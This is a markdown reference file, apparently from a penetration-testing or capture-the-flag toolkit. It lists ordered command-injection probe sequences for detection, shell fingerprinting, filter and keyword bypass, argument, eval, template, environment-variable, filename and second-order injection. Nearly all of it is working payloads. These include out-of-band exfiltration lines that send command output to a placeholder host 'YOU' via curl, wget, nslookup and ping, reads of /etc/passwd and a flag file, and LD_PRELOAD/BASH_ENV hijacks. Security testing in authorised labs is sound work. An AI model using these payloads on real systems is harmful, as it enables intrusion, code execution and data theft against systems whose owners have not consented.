# Detection Sequences — the ordered probe sets

## The canonical sequence — the 10 probes that classify the surface

Run these in order; stop when the class is proven or a falsifier holds.

```
x                              — baseline — the clean response
x;id                           — ; separator
x|id                           — pipe
x`id`                          — backtick
x$(id)                         — substitution
x%0aid                         — newline
x&&id                          — and
x||id                          — or
x&id                           — bg-ampersand (POSIX+cmd)
x;sleep 5                      — timing-side
```

Map each response: did `uid=`/`gid=`/`nt authority`/`Directory:` appear?
Did the response take ≥5s? Did the input reflect literally? Did the
server 4xx/5xx?

## The fingerprint sequence — which shell is it

```
x;id                 — uid= → POSIX
x&whoami             — nt authority\ → Windows cmd
x;whoami             — both — check output-shape
x;uname -a           — Linux/Darwin → POSIX
x|ver                — Microsoft Windows → cmd
x;ls                 — POSIX ls vs PS-alias-dir — the output shape
x;dir                — cmd dir vs POSIX dir-not-found
x;pwd                — POSIX pwd vs PS-pwd vs cmd error
x;cat /etc/passwd    — POSIX
x;type c:\windows\system.ini  — cmd
x;hostname           — universal
x;ps                 — POSIX ps vs PS-Get-Process
x;env                — POSIX env vs cmd set
x;set                — cmd set
x;echo %OS%          — cmd var-expand → Windows_NT
x;echo $SHELL        — POSIX var-expand → /bin/sh
x;echo $0            — POSIX → sh/bash/dash
x;echo %PATH%        — cmd → c:\...
x;powershell -c id   — PS-side
x;powershell -enc <b64> — PS-b64
x;cmd /c id          — cmd-side explicit
```

## The channel sequence — when output is filtered

```
x;id                           — stdout channel
x;id 2>&1                      — stderr→stdout
x;id|base64                    — encoded stdout
x;id|xxd -p                    — hex stdout
x;id>/tmp/o                    — file-write
x;id>/tmp/o;cat /tmp/o         — write+read
x;sleep 5                      — timing
x;curl http://YOU/x            — OOB-http
x;nslookup x.YOU               — OOB-dns
x;ping -c1 x.YOU               — OOB-icmp
x;$(cat /flag)                 — error-channel
x;echo$(cat /flag)             — echo-in-substitution
x;cat /flag|base64             — b64-read
x;cat /flag|xxd -p             — hex-read
x;cat /flag|od -A n -t x1      — octal-read
x;cat /flag|wc -c              — length-only
x;cat /flag|md5sum             — hash — compare-vs-known
```

## The filter-map sequence — which byte is blocked

```
x;id            — tests ;
x|id            — tests |
x&id            — tests &
x`id`           — tests `
x$(id)          — tests $(
x%0aid          — tests \n
x%09id          — tests \t
x${IFS}id       — tests ${IFS}
x{cat,/flag}    — tests {,}
x>f             — tests >
x<f             — tests <
x'id'           — tests '
x"id"           — tests "
x id            — tests space
```

Each probe that fails names a filter byte — the union is the constraint map.

## The keyword-filter sequence — which word is blocked

```
x;cat /flag         — tests cat
x;c'a't /flag       — tests quote-split
x;/bin/cat /flag    — tests path
x;/???/cat /flag    — tests glob
x;f=cat;$f /flag    — tests var
x;$(echo Y2F0|base64 -d) /flag  — tests decode
x;id                — tests id
x;whoami            — tests whoami
x;ls                — tests ls
x;cat${IFS}/flag    — tests cat+IFS
x;cat flag*         — tests glob-flag
```

## The arg-injection sequence — when the shell can't split

```
x=-c4              — flag-form
x=--upload-pack=id — git-upload-pack
x=-T id            — -T-style
x=-f/etc/passwd    — -f file-read
x=--config=id      — config-exec
x=-oProxyCommand=id — ssh-style
x=--checkpoint-action=exec=id — tar-style
x=-e id            — -e-style
x=--output=/tmp/o  — write-form
x=@server          — dig-server
x=+short           — dig-option
```

## The evaluator sequence — `eval-injection.md`

```
7*7                — 49 → evaluator exists
{{7*7}}            — 49 → template — ssti class
${7*7}             — 49 → EL/PS/bash-template
#{7*7}             — 49 → Ruby/SpEL/Groovy
<%=7*7%>           — 49 → ERB/EJS/JSP
system('id')       — PHP-eval runs it
phpversion()       — PHP-eval fingerprint
__import__('os').system('id')  — python
sys.version_info   — python fingerprint
require('child_process').execSync('id')  — node
process.version    — node fingerprint
`id`               — ruby backtick-eval
%x{id}             — ruby
Runtime.getRuntime().exec('id')  — java
```

## The blind-sequence — when nothing reflects

```
x;sleep 5          — timing — control: x;true
x;sleep 5;sleep 5  — cumulative
x;nslookup x.YOU   — OOB-dns — needs oob_listener
x;curl http://YOU/x  — OOB-http
x;curl http://YOU/$(id|base64|tr -d '\n')  — OOB-with-data
x;wget --post-data="$(id)" http://YOU/      — OOB-post
x;ping -c1 $(id|base64|tr -d '\n').YOU     — OOB-icmp-data
x;$(cat /flag)     — error-channel
x;echo x>/tmp/o    — file-write → ?f=/tmp/o
x;id>/tmp/o        — write+read
x;cat /flag>/tmp/o — write the flag
x;if[ -f /flag ];then sleep 5;fi          — boolean-timing
x;sleep$([ -f /flag ]&&echo 5||echo 0)    — differential
x;[ -f /flag ]&&sleep 5                   — condition
x;sleep$((`cat /flag|wc -c`))             — length-as-sleep
```

## The second-order sequence — `second-order.md`

```
POST /register  name=x;id          — stored name
POST /comment   body=x;id          — stored body
POST /job       cmd=x;id           — queued job
POST /config    {"backup":"x;id"}  — stored config
POST /upload    filename="x.png;id" — stored filename
GET  /admin/tool                    — the later-exec — check whether it ran
```

The payload fires when the admin/cron/worker runs — the probe must wait
+ check a channel (OOB/timing/log-side).

## The filename-injection sequence — `filename-injection.md`

```
POST /upload  filename="x.png;id"      — the name is the arg
POST /upload  filename="x.png|id"
POST /upload  filename="x.png`id`"
POST /upload  filename="x.png$(id)"
POST /upload  filename="x.png;id.png"
POST /upload  filename="../../x.png;id" — traversal+sep
POST /upload  filename="x.png%3bid"    — encoded sep in name
```

## The env-var-injection sequence — `env-var-injection.md`

```
?x=BASH_ENV;/tmp/x&cmd=sh     — env-pair injection
?x=LD_PRELOAD;/tmp/x.so
?x=PROMPT_COMMAND;id
?x=SHELLOPTS;xtrace
?x=PS4;$(id)
?x=ENV;/tmp/x
?x=PYTHONSTARTUP;/tmp/x
?x=NODE_OPTIONS;--require /tmp/x
?x=PERL5OPT;-M/tmp/x
?x=RUBYOPT;-r/tmp/x
?x=GIT_SSH_COMMAND;id
?x=EDITOR;id
?x=PAGER;id
?x=LESSOPEN;|id
```

## The "the param is an array" sequence

```
?host[]=x;id
?host[]=x&host[]=id
?host[0]=x;id
?host[a]=x;id
{"host":["x;id"]}
{"host":["x","id"]}
{"args":["-c","4","x;id"]}
{"args":["x;id"]}
{"cmd":["x;id"]}
```

## The sequence-endpoint — when every probe fails

If all 10+ probes inert:

1. Check the white-box — is there any exec-shaped sink? (`whitebox-hunt.md`)
2. Check the response-shape — is the input even reaching the app?
   (echo the input back — does it appear?)
3. Check `denied-conditions.md` — state the falsifier
4. Record `knowledge/attempts/` — the kill-map
5. `tools/decide.py` → `escalate`

## Output to record

- the probe-set + which index produced the signal + the verbatim output
